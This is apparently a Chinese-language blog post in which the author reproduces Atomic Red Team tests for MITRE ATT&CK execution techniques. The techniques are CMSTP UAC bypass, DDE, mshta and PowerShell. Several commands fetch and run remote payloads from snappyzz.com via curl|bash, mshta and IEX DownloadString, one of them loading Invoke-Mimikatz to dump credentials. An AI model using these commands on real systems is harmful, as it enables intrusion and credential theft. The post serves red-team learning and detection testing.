---
layout: post
title: 跟着ATT&CK学安全之execution
excerpt: "跟着ATT&CK学安全之execution"
categories: [ATT&CK]
comments: true
---
#### T1191 - CMSTP
Microsoft Connection Manager Profile Installer (CMSTP.exe)是一个安装连接管理配置的应用程序.它允许接受一个INF文件作为参数,安装一个服务,来进行远程连接.红队可用CMSTP.exe和inf文件来生成恶意命令.CMSTP.exe现在拒绝从远程加载dll,但由于CMSTP.exe是一个合法的程序,且有微软的签名,这个运行仍然可以绕过基于白名单和AppLocker的防御.

CMSTP.exe也可以通过COM接口绕过UAC来执行二进制文件

关于用户账户控制(UAC):UAC 会阻止未经授权应用程序的自动安装，防止无意中对系统设置进行更改。例如选择总是通知将会:
- 当程序试图安装软件或对电脑做出更改时通知你。
- 当你对 Windows 设置进行更改时通知你。
- 冻结其他任务，直到你做出响应。
##### 测试1 CMSTP 运行远程脚本
平台:Windows.运行方式如下`cmstp.exe /s T1191.inf`

window10运行成功
##### 测试2 CMSTP运行绕过UAC
红队可通过向inf文件中植入RunPreSetupCommandsSection来调用cmd.exe,来绕过UAC
```bash
cmstp.exe /s T1191_uacbypass.inf /au
```
window10运行成功
#### T1059 - Command-Line Interface
这个没什么好说的,就是一个命令行运行文件

平台:Linux,运行如下命令
```bash
bash -c "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash"
或者
bash -c "wget --quiet -O - http://snappyzz.com/echo-art-fish.sh | bash"
```
centos上运行成功


#### T1173 - Dynamic Data Exchange
关于动态数据交换（DDE, Dynamic Data Exchange）:DDE是一种动态数据交换机制（Dynamic Data Exchange，DDE）。使用DDE通讯需要两个Windows应用程序，其中一个作为服务器处理信息，另外一个作为客户机从服务器获得信息。客户机应用程序向当前所激活的服务器应用程序发送一条消息请求信息，服务器应用程序根据该信息作出应答，从而实现两个程序之间的数据交换。红队可用DDE来运行二进制命令,微软的文档可以用来放入DDE命令

新建一个Word文档，通过Ctrl+F9添加一个域，然后修改域代码为：
```bash
DDEAUTO c:\windows\system32\cmd.exe "/k calc.exe" 
```
这个并没有复现成功
#### T1118 - InstallUtil
这个就是一个安装和卸载的组件
这个没有复现成功
##### 测试1 InstallUtil uninstall method call
#### T1170 - Mshta
Mshta.exe是用来运行Microsoft HTML Applications (HTA)的.HTA是一个独立的应用,使用的和浏览器同样的技术,但是独立与浏览器.红队和用它来运行Javascript 或者VBScript.它可以用来绕过白名单的防护,也可以绕过浏览器安全防护
##### 测试1 Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject
```bash
mshta.exe javascript:a=(GetObject("script:http://snappyzz.com/mshta.sct")).Exec();close();
```
windows10上运行成功
##### 测试2 Mshta calls a local VBScript file to launch notepad.exe
```bash
mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""C:\Windows\SysWOW64\calc.exe"")(window.close)")
```
windows10上运行成功
##### 测试3 Mshta executes VBScript to execute malicious command
运行本地的VB脚本通过powershell枚举用户
```bash
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -noexit -file D:\pycharmproject\atomic-red-team-master\atomics\T1170\src\powershell.ps1"":close")
```
windows10上运行成功
##### 测试4 Mshta Executes Remote HTML Application (HTA)
```bash
mshta.exe http://snappyzz.com/T1170.hta
```
windows10上运行成功
#### T1086 - PowerShell
##### 测试1 下载Mimikatz并dump credentials
```bash
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('http://snappyzz.com/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
```
windows10上运行成功
##### 测试2 
下载Bloodhound并运行
```bash
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('http://snappyzz.com/SharpHound.ps1'); Invoke-BloodHound"
```
被win10防病毒拦下
未完待续

#### T1064 - Scripting
这个太简单了把
##### 测试1 在linux上运行脚本
```
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"
chmod +x /tmp/art.sh
sh /tmp/art.sh
```
windows10上运行成功
##### 测试2 在windows上运行脚本
```
C:\Windows\system32\cmd.exe /Q /c echo #{command_to_execute} > #{script_to_create}
C:\Windows\system32\cmd.exe /Q /c #{script_to_create}
```
清除
```
del #{script_to_create}
```
windows10上运行成功
#### T1216 - Signed Script Proxy Execution
带有证书的脚本可以用来执行恶意文件
这个也未完待续


